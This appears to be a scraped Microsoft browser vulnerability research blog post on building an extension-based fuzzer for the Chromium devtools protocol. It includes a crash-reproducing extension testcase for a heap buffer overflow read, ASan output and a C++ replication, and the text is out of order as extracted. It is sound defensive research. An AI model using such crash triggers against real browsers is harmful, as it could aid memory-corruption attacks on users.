100); }); }); Once we were able to reliably crash the browser it turned out to be an upstream issue and so it was reported to them. The bug report is now public and you can see it here. What Happened The bug is due to unmodifiedText (line 11 in the last screenshot) was handled in the browser process without taking account of null termination which lead to a heap buffer overflow (read), as caseq@ (assigned to this bug) mentions: “…That said, this may lead to us sending a piece of browser memory into renderer.” Let’s take a closer look: 1 2 3 4 5 6 7 8 9 10 11 12 #include &lt;uchar.h&gt; #include &lt;stdio.h&gt; #include &lt;string&gt; int main(void) { char16_t char16[] = u&quot;ABCD&quot;; std::u16string text16(u&quot;ABCD&quot;); printf(&quot;size of char16 = %zu\\n&quot;, sizeof char16 / sizeof *char16); printf(&quot;size of text16 = %zu\\n&quot;, text16.size()); } Out: 1 2 3 PS C:\\Users\\test\\Desktop\\mkhtbr&gt; ./test.exe size of char16 = 5 size of text16 = 4 Note the above output; char16_t should end with a null byte which is why its size is bigger than the u16string. Let’s modify this to replicate the same underlying bug found: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include &lt;uchar.h&gt; #include &lt;stdio.h&gt; #include &lt;string&gt; int main(void) { char16_t *char16=(char16_t*)malloc(4 * sizeof(char16_t)); std::u16string text16(u&quot;ABCD&quot;); printf(&quot;size of char16 = %zu\\n&quot;, sizeof char16 / sizeof *char16); printf(&quot;size of text16 = %zu\\n&quot;, text16.size()); for (size_t i = 0; i &lt; text16.size(); ++i){ char16[i] = text16[i]; } // Try to access everything in the &#39;char16_t&#39; array assuming &#39;4&#39; is limit. for (size_t n = 0; n &lt;= 4; n++) { printf(&quot;n=%#x &amp; &quot;, n); printf(&quot;char16[n]=%#x\\n&quot;, char16[n]); } } We compile using AddressSanitizer by executing the following: 1 clang++ -O1 -g -fsanitize=address -fno-omit-frame-pointer -o a.exe .\\old.cpp Finally, we run it: 1 2 3 4 5 6 7 8 9 10 11 PS C:\\Users\\test\\Desktop\\mkhtbr&gt; ./test.exe size of char16 = 4 size of text16 = 4 n=0 &amp; char16[n]=0x41 n=0x1 &amp; char16[n]=0x42 n=0x2 &amp; char16[n]=0x43 n=0x3 &amp; char16[n]=0x44 n=0x4 &amp; ================================================================= ERROR: AddressSanitizer: heap-buffer-overflow on address 0x11cdab3a0038 at pc 0x7ff780c517d1 bp 0x0044ccf0f4e0 sp 0x0044ccf0f528 READ of size 2 at 0x11cdab3a0038 thread T0 #0 0x7ff780c517d0 in main C:/Users/test/Desktop/mkhtbr/./test.cpp:20:35 As you can see, this is the same crash as the Chromium bug. Upstream fixed it swiftly and correctly guessed it was a bug that’s been there for a while (which meant it was likely in the stable version affecting all users). Conclusion We’ve only covered the initial development of this fuzzer, we’re continuously developing it by adding more APIs and running it during development. So far it has found the following security issues: ID Title Upstream Severity N/A Heap UaF in edge::fre:: █ █ █ █:: █ █ █ █ █ No High 1297404 Heap UaF in global_media_controls::MediaItemManagerImpl::HideItem Yes High 1283077 Heap buffer overflow read in webui tabstrip Yes High 1276331 Heap buffer overflow read in blink::mojom::WidgetInputHandlerProxy::DispatchEvent Yes High Here is what it looks like currently when running it, it gets progressively chaotic as time goes by (not sped up and using ASan). Coming Soon We will soon be posting another guest blogpost by David Erceg where he will discuss some of the bugs he found as well as sharing his methodology. Also included in the post will be some of the ways the Edge Security Team reacted to his reports to find variants. Until then, check out his first guest blogpost if you haven’t already.","url":"https://microsoftedge.github.io/edgevr/posts/a-story-of-a-bug-found-fuzzing/","@type":"BlogPosting","headline":"A Story of a Bug Found Fuzzing","dateModified":"2022-06-10T08:30:00-07:00","datePublished":"2022-06-10T08:30:00-07:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://microsoftedge.github.io/edgevr/posts/a-story-of-a-bug-found-fuzzing/"},"@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/edgevr/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/edgevr/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/edgevr/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/edgevr/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/edgevr/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/edgevr/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/edgevr/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/edgevr/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/edgevr/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/edgevr/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/edgevr/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/edgevr/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/edgevr/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/edgevr/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/edgevr/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/edgevr/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/edgevr/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/edgevr/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/edgevr/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/edgevr/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/edgevr/assets/css/post.css"><link rel="stylesheet" href="/edgevr/assets/css/post.css"><link rel="preload" as="style" href="/edgevr/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/edgevr/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <script type="text/javascript"> (function(c,l,a,r,i,t,y){ c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)}; t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i; y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y); })(window, document, "clarity", "script", "4xpt5cebre"); </script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/edgevr/assets/js/post.min.js" async></script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js" async></script> <script src="/edgevr/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/edgevr/" alt="avatar"> <img src="/edgevr/assets/img/edge-logo-128x128.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/edgevr/">Microsoft Browser <b>Vulnerability Research</b></a></div><div class="site-subtitle font-italic">News from the lab</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/edgevr/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/edgevr/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/edgevr/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/edgevr/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper" style="margin-right: 9px;"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightkMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightkMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border" style="display:none;"></span> <a href="https://github.com/MicrosoftEdge" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="/edgevr/feed.xml" > <i class="fas fa-rss"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/edgevr/"> Posts </a> </span> <span>A Story of a Bug Found Fuzzing</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>A Story of a Bug Found Fuzzing</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Jun 10, 2022, 8:30 AM -0700" > Jun 10 <i class="unloaded">2022-06-10T08:30:00-07:00</i> </span> by <span class="author"> Abdulrahman Alqabandi <a href="https://twitter.com/qab" title="Author's Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> </span></div></div><div class="post-content"><p>In a previous blogpost it covered and mentioned automation and how it is great at finding memory issues. We also got some feedback to expand on fuzzing, so this post will cover how we came to develop a fuzzer and how it found its first security issue early in development.</p><p>The main intention of this fuzzer is to use the signal from MSRC cases and see if it can find the next bug before it gets reported which follows the same pattern. The result was a cool browser fuzzer and the experiment yielded interesting results.</p><h1 id="the-target">The Target</h1><p>We noticed a pattern in recent memory corruption bugs affecting both Edge and Chromium where an extension was used as a proof of concept. This was particularly interesting to me because I <a href="https://leucosite.com/WebExtension-Security-Part-2/">looked at extensions</a> a few years ago and only found logic bugs and, with an itch to make an experimental fuzzer why not try to create an extension based fuzzer for some variant hunting.</p><p>Now that I have a general component (Web Extensions) as a target, where to start?</p><p>When reading through all of the publicly disclosed chromium bugs that involved an extension and a browser crash, two bugs from <a href="https://twitter.com/david_erceg">David Erceg</a> stood out (<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1188889">1188889</a>, <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1190550">1190550</a>) where the <code class="language-plaintext highlighter-rouge">chrome.debugger.sendCommand</code> was used and it was interesting.</p><p>The <code class="language-plaintext highlighter-rouge">chrome.debugger</code> extension API allows you to control some tabs using the <a href="https://chromedevtools.github.io/devtools-protocol/">devtools protocol</a>, this is the same protocol remote debugging uses. The function <code class="language-plaintext highlighter-rouge">sendCommand</code> stood out which looks like the following:</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nx">chrome</span><span class="p">.</span><span class="k">debugger</span><span class="p">.</span><span class="nx">sendCommand</span><span class="p">(</span>
  <span class="nx">target</span><span class="p">:</span> <span class="nx">Debuggee</span><span class="p">,</span>
  <span class="nx">method</span><span class="p">:</span> <span class="nx">string</span><span class="p">,</span>
  <span class="nx">commandParams</span><span class="p">?:</span> <span class="nx">object</span><span class="p">,</span>
  <span class="nx">callback</span><span class="p">?:</span> <span class="kd">function</span><span class="p">,</span>
<span class="p">)</span>
</pre></table></code></div></div><p>This looks like a promising function to start fuzzing.</p><h1 id="gathering-more-information">Gathering More Information</h1><p>Now that a more specific API was identified, let’s look at what kind of input it takes:</p><ol><li><strong>target</strong>: This is a simple object that contains either the extensionId, tabId or targetId of the target.</li><li><strong>method</strong>: This is a string that must contain valid values, can’t generate random strings here.</li><li><strong>commandParams</strong>: “<a href="https://developer.chrome.com/docs/extensions/reference/debugger/#method-sendCommand">JSON object with request parameters. This object must conform to the remote debugging params scheme for given method.</a>” Also can’t generate random strings here for param names.</li><li><strong>callback</strong>: expected</li></ol><p>In order to create valid and relevant method and command parameters, we need to look up and learn about this devtools protocol. Thankfully, the devtools folks have a <a href="https://github.com/ChromeDevTools/devtools-protocol/tree/master/json">JSON file describing all these method names</a> and their parameters including what type of values they expect. Perfect!</p><div class="language-json highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
    </span><span class="nl">"version"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"major"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"minor"</span><span class="p">:</span><span class="w"> </span><span class="s2">"3"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="nl">"domains"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"domain"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Accessibility"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"experimental"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
            </span><span class="nl">"dependencies"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
                </span><span class="s2">"DOM"</span><span class="w">
            </span><span class="p">],</span><span class="w">
            </span><span class="nl">"types"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
                </span><span class="p">{</span><span class="w">
                    </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"AXNodeId"</span><span class="p">,</span><span class="w">
                    </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Unique accessibility node identifier."</span><span class="p">,</span><span class="w">
                    </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"string"</span><span class="w">
                </span><span class="p">},</span><span class="w">
                </span><span class="p">{</span><span class="w">
                    </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"AXValueType"</span><span class="p">,</span><span class="w">
                    </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Enum of possible property types."</span><span class="p">,</span><span class="w">
                    </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"string"</span><span class="p">,</span><span class="w">
                    </span><span class="nl">"enum"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
                        </span><span class="s2">"boolean"</span><span class="p">,</span><span class="w">
                        </span><span class="s2">"tristate"</span><span class="p">,</span><span class="w">
                        </span><span class="s2">"booleanOrUndefined"</span><span class="p">,</span><span class="w">
                        </span><span class="s2">"idref"</span><span class="p">,</span><span class="w">
                        </span><span class="s2">"idrefList"</span><span class="p">,</span><span class="w">
                        </span><span class="s2">"integer"</span><span class="p">,</span><span class="w">
                        </span><span class="err">..</span><span class="w">
                        </span><span class="err">...</span><span class="w">
</span></pre></table></code></div></div><p>This means the extension that eventually gets installed on the browser can consume this JSON file and use its data to construct somewhat valid devtools protocol commands. Since the types are described, it can generate the value of any given type with random values conveniently.</p><p>But wait, if this fuzzer needs to install an extension on the fly, how can that be achieved?</p><h1 id="the-harness">The Harness</h1><p>The great thing about Chromium is that there are a lot of run time flags that do all sorts of things. In this case there are a couple of flags that will load extensions on startup:</p><p><code class="language-plaintext highlighter-rouge">--disable-extensions-except="C:/ext/"</code></p><p><code class="language-plaintext highlighter-rouge">--load-extension="C:/ext/"</code></p><p>(You can find a list of these flags <a href="https://peter.sh/experiments/chromium-command-line-switches/">here</a>, though not actively maintained so make sure to verify by <a href="https://source.chromium.org/search?q=%22--no-sandbox%22">looking up the flag in chromium source</a>)</p><p>This harness will be simple and straightforward, all it needs is to control the launching of the target binary (the browser) with command line flags as well as handle/detect all types of crashes. Additionally, it needs to log everything and make sure the fuzzing process runs continuously. Sometimes it’s the job of the harness to feed testcases into the browser but for this case we only load one ‘testcase’ (an extension) that continuously runs until a crash or timeout then the harness repeats.</p><p>This basic harness is using NodeJS and it does the following:</p><ol><li>Contain a list of useful flags (like <code class="language-plaintext highlighter-rouge">--no-sandbox</code> which is important in ASan builds as otherwise we won’t see child process crashes)</li><li><a href="https://nodejs.org/api/child_process.html#child_processspawncommand-args-options">Spawn</a> browser using the flags<ul><li>Save all <a href="https://en.wikipedia.org/wiki/Standard_streams">stdout</a> from the browser process</li></ul></li><li>Handle gracefully when browser crashes<ul><li>Check <a href="https://nodejs.org/api/child_process.html#event-exit">crash signal</a></li><li>Save ASan report and <code class="language-plaintext highlighter-rouge">stdout</code> logs</li></ul></li><li>Clean up and restart</li></ol><h1 id="the-extension">The Extension</h1><p>As mentioned before, the way it will be fuzzing the extension API is by loading one giant extension and listen for crashes. It seems much faster than creating thousands of extensions and loading them, but with this speed come some drawbacks.</p><p>The idea of this extension is for it to have all the permissions that are relevant to us, in this case the <code class="language-plaintext highlighter-rouge">debugging</code> permission and others which can be helpful (<code class="language-plaintext highlighter-rouge">tabs</code> and <code class="language-plaintext highlighter-rouge">&lt;all_urls&gt;</code> host permission). Once it loads it will consume the devtools protocol JSON ‘database’ and using the data there it creates somewhat valid devtools protocol commands.</p><p>Some sample generated commands:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://microsoftedge.github.io/edgevr/assets/img/blog_img/fuzzer_bug/extuiconsole.gif" alt="console output showing devtool commands" /></p><p>We’re not paying much attention to the semantics of the fuzzed values as far as parameter values (the names should be valid), some will throw errors and that’s fine for now. We want to quickly get our fuzzer running and then improvements can be made.</p><p>As soon as all the pieces were connected and the fuzzer was running, a lot of crashes started occurring and other annoyances like randomly generated commands can result in either the extension crashing or stalling. Once these initial “fuzz blocker” bugs got fixed the fuzzer ran smoothly for a short time before finding the first valid security bug.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>ERROR: AddressSanitizer: heap-buffer-overflow on address 0x11f305796100 at pc 0x7ff8dd649dfc bp 0x00c8065fd2f0 sp 0x00c8065fd338
READ of size 2 at 0x11f305796100 thread T0
    #0 0x7ff8dd649dfb in std::__1::basic_string&lt;char16_t,std::__1::char_traits&lt;char16_t&gt;,std::__1::allocator&lt;char16_t&gt; &gt;::basic_string&lt;std::nullptr_t&gt; C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\string:835
    #1 0x7ff8dd649a84 in mojo::StructPtr&lt;blink::mojom::KeyData&gt;::StructPtr&lt;const int &amp;,const int &amp;,const int &amp;,const int &amp;,const bool &amp;,const bool &amp;,const char16_t (&amp;)[4],const char16_t (&amp;)[4]&gt; C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\struct_ptr.h:63 
</pre></table></code></div></div><p>This is always a great sign, especially early in development. However, some of the early decisions came back to bite. The decision to only have one extension rather than generating thousands of extensions meant we do not have a conventional testcase that reproduced this crash once a crash occurred. Instead, we rely on logging to see which commands were fired before the crash. The logs showed the following command call right before crash:</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>      <span class="nx">chrome</span><span class="p">.</span><span class="k">debugger</span><span class="p">.</span><span class="nx">sendCommand</span><span class="p">({</span> <span class="na">tabId</span><span class="p">:</span> <span class="nx">atabid</span> <span class="p">},</span> <span class="dl">"</span><span class="s2">Input.dispatchKeyEvent</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
        <span class="na">type</span><span class="p">:</span> <span class="nx">unescape</span><span class="p">(</span><span class="dl">"</span><span class="s2">keyDown</span><span class="dl">"</span><span class="p">),</span>
        <span class="na">modifiers</span><span class="p">:</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
        <span class="na">TimeSinceEpoch</span><span class="p">:</span> <span class="o">-</span><span class="mi">129</span><span class="p">,</span>
        <span class="na">text</span><span class="p">:</span> <span class="nx">unescape</span><span class="p">(</span><span class="dl">"</span><span class="s2">%uA8E9%5E%uD866%uDD5E</span><span class="dl">"</span><span class="p">),</span>
        <span class="na">unmodifiedText</span><span class="p">:</span> <span class="nx">unescape</span><span class="p">(</span><span class="dl">"</span><span class="s2">%uD834%uDD6F%uDB43%uDD46</span><span class="dl">"</span><span class="p">),</span>
        <span class="na">keyIdentifier</span><span class="p">:</span> <span class="nx">unescape</span><span class="p">(</span><span class="dl">"</span><span class="s2">%26%3D%uDB40%uDCF6%u0660</span><span class="dl">"</span><span class="p">),</span>
        <span class="na">code</span><span class="p">:</span> <span class="nx">unescape</span><span class="p">(</span><span class="dl">"</span><span class="s2">%7C%uE468</span><span class="dl">"</span><span class="p">),</span>
        <span class="na">key</span><span class="p">:</span> <span class="nx">unescape</span><span class="p">(</span><span class="dl">"</span><span class="s2">%uC79B%uD84A%uDFF9%uD834%uDD66%uDB42%uDDE5%uD85E%uDFD1</span><span class="dl">"</span><span class="p">),</span>
        <span class="na">windowsVirtualKeyCode</span><span class="p">:</span> <span class="o">-</span><span class="mi">128</span><span class="p">,</span>
        <span class="na">nativeVirtualKeyCode</span><span class="p">:</span> <span class="mi">16</span><span class="p">,</span>
        <span class="na">autoRepeat</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
        <span class="na">isKeypad</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
        <span class="na">isSystemKey</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
        <span class="na">location</span><span class="p">:</span> <span class="mi">4096</span><span class="p">,</span>
        <span class="na">commands</span><span class="p">:</span> <span class="p">[</span><span class="dl">"</span><span class="s2">≤áÄí-</span><span class="dl">"</span><span class="p">],</span>
      <span class="p">});</span>
</pre></table></code></div></div><p>When running this command manually in a plain extension it did not crash the browser. After some digging around it turns out we had to run it multiple times as we opened a new window as a debug target. The reliably reproducible extension testcase looked like this now:</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">atabid</span><span class="p">;</span>
<span class="nx">chrome</span><span class="p">.</span><span class="nx">windows</span><span class="p">.</span><span class="nx">create</span><span class="p">({</span> <span class="na">url</span><span class="p">:</span> <span class="dl">"</span><span class="s2">about:blank</span><span class="dl">"</span><span class="p">,</span> <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">normal</span><span class="dl">"</span> <span class="p">},</span> <span class="p">(</span><span class="nx">w</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="nx">atabid</span> <span class="o">=</span> <span class="nx">w</span><span class="p">.</span><span class="nx">tabs</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">id</span><span class="p">;</span>
  <span class="nx">chrome</span><span class="p">.</span><span class="k">debugger</span><span class="p">.</span><span class="nx">attach</span><span class="p">({</span> <span class="na">tabId</span><span class="p">:</span> <span class="nx">atabid</span> <span class="p">},</span> <span class="dl">"</span><span class="s2">1.3</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="nx">setInterval</span><span class="p">((</span><span class="nx">g</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="nx">chrome</span><span class="p">.</span><span class="k">debugger</span><span class="p">.</span><span class="nx">sendCommand</span><span class="p">({</span> <span class="na">tabId</span><span class="p">:</span> <span class="nx">atabid</span> <span class="p">},</span> <span class="dl">"</span><span class="s2">Input.dispatchKeyEvent</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
        <span class="na">type</span><span class="p">:</span> <span class="nx">unescape</span><span class="p">(</span><span class="dl">"</span><span class="s2">keyDown</span><span class="dl">"</span><span class="p">),</span>
        <span class="na">modifiers</span><span class="p">:</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
        <span class="na">TimeSinceEpoch</span><span class="p">:</span> <span class="o">-</span><span class="mi">129</span><span class="p">,</span>
